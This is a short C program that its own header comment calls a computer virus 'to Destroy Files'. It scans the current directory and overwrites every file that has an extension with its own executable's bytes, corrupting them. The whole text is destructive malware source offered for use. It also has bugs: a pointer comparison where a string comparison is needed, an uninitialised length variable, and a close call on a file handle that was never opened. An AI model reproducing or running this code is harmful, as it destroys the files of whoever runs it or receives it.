//Develop Computer Virus Using C to Destroy Files
#include<stdio.h>
#include<time.h>
#include<stdlib.h>
#include<dirent.h>
#include <unistd.h>

void main(int argc,char* argv[])
{
    printf("%s,\n",argv[0]);
    char path[FILENAME_MAX];
    getcwd(path, FILENAME_MAX );
    char* ext;
    unsigned long x;
    DIR* dr = opendir(path);
    struct dirent* de;
    char files[100][50] = {"\0"}; 
    //opens directory
    int count = -2;
    printf("Current working dir: %s\n", path);
    char buff[2048];

    if (dr == NULL){
        printf("Could not open current directory");
        return;
    }
    
    while ((de = readdir(dr)) > 0) {
        ext = strrchr(de->d_name, '.');
	if((count > -1)){
            if (ext) {
	        printf("%s to be virused up\n",de->d_name);
		strcpy(files[count], de->d_name);
	    }else{
                printf("%s no end file\n",de->d_name);
		count--;
            }
	}
        count++;
    }
    int j = 0;
    //opens files
    FILE *virus,*host;
    while (j<count) {
        char vir[FILENAME_MAX];
        char hos[FILENAME_MAX];
        strcpy(hos, path);
        strcat(hos, "/");
        strcat(hos, files[j]);
        strcpy(vir, path);
        strcat(vir, "/");
	strcat(vir,argv[0]);
        if(vir==hos){
            fclose(host);
	    j++;
	    continue;
	}

        if ((host = fopen(hos, "rb+")) == NULL) {
            printf("Error! opening file %s\n",files[j]);
            return;
        }
	if ((virus = fopen(vir, "rb")) == NULL) {
            printf("Error! opening file %s\n",files[j]);
            return;
        }

        else {
	    while(fread(buff,2048,1,virus))
            {
                fwrite(buff,2048,1,host);
		printf("%s",buff);
            }
        fread(buff,x,1,virus);
        fwrite(buff,x,1,host);
        }
	fclose(host);
	fclose(virus);
        j++;
    }

    
}